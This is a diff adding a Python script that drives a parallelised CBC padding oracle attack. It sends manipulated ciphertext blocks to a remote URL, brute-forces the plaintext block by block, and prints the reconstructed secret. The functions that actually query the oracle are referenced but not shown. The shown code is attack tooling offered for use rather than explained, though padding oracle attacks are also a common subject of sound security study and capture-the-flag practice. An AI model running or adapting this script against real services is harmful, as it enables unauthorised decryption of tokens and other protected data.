@@ -1,0 +1,132 @@
+from base64 import b64encode as benc, b64decode as bdec
+from multiprocessing import Manager
+from argparse import ArgumentParser
+import time
+import requests
+import parmap
+
+BLOCK_SIZE = 16
+
+def print_decrypted_block(recovered_block: str, ctx_chunk_length: int, results: dict) -> None:
+    """
+    Print the decrypted block and update the results dictionary.
+
+    Args:
+        recovered_block (str): The decrypted block.
+        ctx_chunk_length (int): Length of the ctx chunk.       
+        results (dict): Dictionary to store the decrypted blocks.
+    """
+    global ctx_original_length
+    if ctx_chunk_length == ctx_original_length:
+        padding_length: int = ord(recovered_block[-1])
+        recovered_block = recovered_block[:-padding_length] + (("\\x%X" % padding_length) * padding_length)
+    print(f"Block ending at {ctx_chunk_length}: decrypted: {recovered_block}")
+    results[ctx_chunk_length] = recovered_block
+
+def divide_ctx_into_chunks(ctx: bytearray) -> list:
+    """
+    Divide ctx into chunks of BLOCK_SIZE.
+
+    Args:
+        ctx (bytearray): The ctx to be divided.
+
+    Returns:
+        list: List of divided chunks.
+    """
+    chunks: list = []
+    assert len(ctx) % BLOCK_SIZE == 0, "The ctx chunk must have a length which is a multiple of 16."
+    while len(ctx) >= 2 * BLOCK_SIZE:
+        chunks.append(ctx)
+        ctx = ctx[:-BLOCK_SIZE]
+    return chunks
+
+def decrypt_last_block(chunk: bytearray, oracle_error_message: str, url: str, results: dict) -> None:
+    """
+    Decrypt the last block of ctx.
+
+    Args:
+        chunk (bytearray): The chunk to decrypt.
+        oracle_error_message (str): The error message pattern.  
+        url (str): The URL of the padding oracle.
+        results (dict): Dictionary to store the decrypted blocks.
+    """
+    old_ctx_val, guessed_ctx_val, fake_padding_val, ptx_val = find_last_byte_of_ptx_block(chunk, oracle_error_message, url)
+    current_bruteforced_ptx_bytes: list = [ptx_val]
+    target_padding: int = fake_padding_val + 1
+    if ptx_val != 1:
+        for _ in range(ptx_val - 1):
+            current_bruteforced_ptx_bytes.insert(0, ptx_val)    
+            target_padding += 1
+    while len(current_bruteforced_ptx_bytes) < BLOCK_SIZE:
+        old_ctx_val, guessed_ctx_val, fake_padding_val, ptx_val = find_byte_of_ptx_block(chunk, target_padding, current_bruteforced_ptx_bytes, oracle_error_message, url)
+        current_bruteforced_ptx_bytes.insert(0, ptx_val)        
+        target_padding += 1
+    recovered_ptx: str = "".join([chr(b) for b in current_bruteforced_ptx_bytes])
+    print_decrypted_block(recovered_ptx, len(chunk), results)
+
+def decrypt_regular_block(chunk: bytearray, oracle_error_message: str, url: str, results: dict) -> None:
+    """
+    Decrypt a regular block of ctx.
+
+    Args:
+        chunk (bytearray): The chunk to decrypt.
+        oracle_error_message (str): The error message pattern.  
+        url (str): The URL of the padding oracle.
+        results (dict): Dictionary to store the decrypted blocks.
+    """
+    old_ctx_val, guessed_ctx_val, fake_padding_val, ptx_val = find_last_byte_of_ptx_block(chunk, oracle_error_message, url)
+    current_bruteforced_ptx_bytes: list = [ptx_val]
+    target_padding: int = fake_padding_val + 1
+    while len(current_bruteforced_ptx_bytes) < BLOCK_SIZE:
+        old_ctx_val, guessed_ctx_val, fake_padding_val, ptx_val = find_byte_of_ptx_block(chunk, target_padding, current_bruteforced_ptx_bytes, oracle_error_message, url)
+        current_bruteforced_ptx_bytes.insert(0, ptx_val)        
+        target_padding += 1
+    recovered_ptx: str = "".join([chr(b) for b in current_bruteforced_ptx_bytes])
+    print_decrypted_block(recovered_ptx, len(chunk), results)
+
+def decrypt_generic_block(chunk: bytearray, oracle_error_message: str, url: str, results: dict) -> None:
+    """
+    Decrypt a generic block of ctx.
+
+    Args:
+        chunk (bytearray): The chunk to decrypt.
+        oracle_error_message (str): The error message pattern.  
+        url (str): The URL of the padding oracle.
+        results (dict): Dictionary to store the decrypted blocks.
+    """
+    global ctx_original_length
+    if len(chunk) == ctx_original_length:
+        decrypt_last_block(chunk, oracle_error_message, url, results)
+    else:
+        decrypt_regular_block(chunk, oracle_error_message, url, results)
+
+def parallelize_decryption(ctx_chunks: list, original_length: int, oracle_error_message: str, url: str, results: dict) -> None: 
+    """
+    Parallelize the decryption process.
+
+    Args:
+        ctx_chunks (list): List of ctx chunks.
+        original_length (int): Original length of ctx.
+        oracle_error_message (str): The error message pattern.  
+        url (str): The URL of the padding oracle.
+        results (dict): Dictionary to store the decrypted blocks.
+    """
+    global ctx_original_length
+    ctx_original_length = original_length
+    parmap.map(decrypt_generic_block, ctx_chunks, oracle_error_message, url, results, pm_pbar=True, pm_parallel=True, pm_processes=len(ctx_chunks))
+
+def reassemble_and_print_ptx(results: dict) -> None:
+    """
+    Reassemble the decrypted blocks and print the reconstructed ptx.
+
+    Args:
+        results (dict): Dictionary containing decrypted blocks. 
+    """
+    ptx: str = ""
+    keys: list = sorted(results.keys())
+    for key in keys:
+        ptx += results[key]
+    print(f"Reconstructed ptx: {ptx}")
+    print(f"Unpadded ptx: {ptx.split('\\xA')[0]}")
+
+# Rest of the code remains unchanged
